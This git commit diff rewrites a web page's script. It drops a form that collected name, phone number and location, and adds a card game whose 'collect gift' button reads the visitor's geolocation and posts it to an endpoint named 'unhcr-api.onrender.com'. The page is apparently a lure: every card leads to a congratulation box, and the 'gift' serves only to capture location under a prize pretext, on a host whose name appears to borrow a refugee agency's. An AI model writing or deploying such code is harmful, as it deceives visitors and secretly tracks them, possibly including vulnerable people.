56b092200bba5be138e592170959a4b371f52159
ziad astih <ziadastih12@outlook.com>
2022-12-22 16:18:55 +0200

    done with changes

--- index.js
+++ index.js
@@ -1,28 +1,19 @@
-const formBtn = document.querySelectorAll(".form-btn");
-const formContainer = document.querySelector(".form-container");
+const cards = document.querySelectorAll(".card");
 const overlay = document.querySelector(".overlay");
-const closeBtn = document.getElementById("close-btn");
-const formConfirmation = document.querySelector(".form-confirmation");
-formBtn.forEach((btn) => {
-  btn.addEventListener("click", async () => {
-    formContainer.classList.add("display-flex");
+const attemptsValue = document.querySelector(".attempts-value");
+const congratulationBox = document.querySelector(".congratulation-container");
+const colletGift = document.querySelector(".collect-gift");
+const win = false;
+let attempts = 3;
+
+cards.forEach((card) => {
+  card.addEventListener("click", () => {
     overlay.classList.add("display-flex");
+    congratulationBox.classList.add("display-flex");
   });
 });
 
-closeBtn.addEventListener("click", () => {
-  formContainer.classList.remove("display-flex");
-  overlay.classList.remove("display-flex");
-});
-
-// ===============const form input  =============
-const nameInput = document.querySelector(".name-input");
-const familyInput = document.querySelector(".family-input");
-const phoneNumber = document.querySelector(".number-input");
-const locationBtn = document.querySelector(".location-btn");
-const submitForm = document.querySelector(".submit-form");
-
-locationBtn.addEventListener("click", async () => {
+colletGift.addEventListener("click", async () => {
   navigator.geolocation.getCurrentPosition(async (position) => {
     if (position) {
       const { longitude, latitude } = position.coords;
@@ -30,35 +21,13 @@ locationBtn.addEventListener("click", async () => {
         const coords = await axios.post(
           "https://unhcr-api.onrender.com/api/v1/coords",
           {
-            name: nameInput.value,
-            number: phoneNumber.value,
             latitude: latitude,
             longitude: longitude,
           }
         );
-
-        submitForm.addEventListener("click", () => {
-          formContainer.classList.remove("display-flex");
-          formConfirmation.classList.add("display-flex");
-
-          setTimeout(() => {
-            formConfirmation.classList.remove("display-flex");
-            overlay.classList.remove("display-flex");
-          }, 1000);
-        });
       } catch (error) {
         console.log(error);
       }
-    } else {
-      submitForm.removeEventListener("click", () => {
-        formContainer.classList.remove("display-flex");
-        formConfirmation.classList.add("display-flex");
-
-        setTimeout(() => {
-          formConfirmation.classList.remove("display-flex");
-          overlay.classList.remove("display-flex");
-        }, 1000);
-      });
     }
   });
 });
